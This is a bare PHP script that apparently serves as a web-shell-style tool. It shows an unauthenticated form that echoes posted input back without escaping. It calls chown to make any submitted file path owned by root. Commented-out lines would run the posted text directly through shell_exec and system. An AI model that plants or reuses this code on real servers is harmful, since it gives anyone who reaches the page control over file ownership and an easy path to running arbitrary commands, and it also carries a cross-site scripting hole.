<?php
echo "<HTML><HEAD><TITLE>system</TITLE></HEAD>";
echo "\n<BODY>";
$temp="<FORM name=f1 action=".$GLOBALS['_SERVER']['PHP_SELF']." method='POST' >";
$temp.="\n<TEXTAREA name=txt rows=10 cols=80>";
if(isset($GLOBALS['_POST']['txt']))
	$temp.=$GLOBALS['_POST']['txt'];
else
	$temp.="";
$temp.="</TEXTAREA>";
$temp.="<br><input type='submit' name='sub'>";
$temp.="\n</FORM>";
echo $temp;
//print_r($GLOBALS['POST']);
if(isset($GLOBALS['_POST']['sub']))
{
//	$output=shell_exec($GLOBALS['_POST']['txt']);
/*	system($GLOBALS['_POST']['txt'],$output);
	echo "<pre>".$output."</pre>";*/
	if(chown($GLOBALS['_POST']['txt'],"root"))
	{
		echo "done";
	}
	else
	{
		echo "Not";
	}
}
else
	echo "sorry";
echo "</BODY></HTML>";
?>
